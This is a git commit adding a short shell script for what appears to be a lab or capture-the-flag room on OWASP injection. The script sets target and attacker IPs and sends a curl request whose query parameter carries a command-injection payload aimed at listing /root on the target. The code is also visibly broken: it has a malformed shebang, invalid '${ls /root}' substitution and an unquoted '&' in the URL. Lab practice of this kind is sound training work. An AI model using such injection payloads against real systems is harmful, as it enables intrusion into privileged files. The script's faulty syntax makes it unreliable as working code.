097bf50204ce627b4bb862400bd5b74945902d84
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 20:30:50 -0500

    Testing script

---
+++ rooms/owasptop102021/3-injection.sh
@@ -0,0 +1,13 @@
+#/bin/sh
+
+# Retrieve absolute path to this script
+script=$(readlink -f $0)
+scriptpath=`dirname $script`
+
+# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
+target_ip="10.10.210.85"
+attack_ip="10.10.30.237"
+
+# Prepare environment
+mkdir /work/ 2>/dev/null
+curl -X GET http://10.10.210.85:82/?cow=default&mooing=${ls /root}
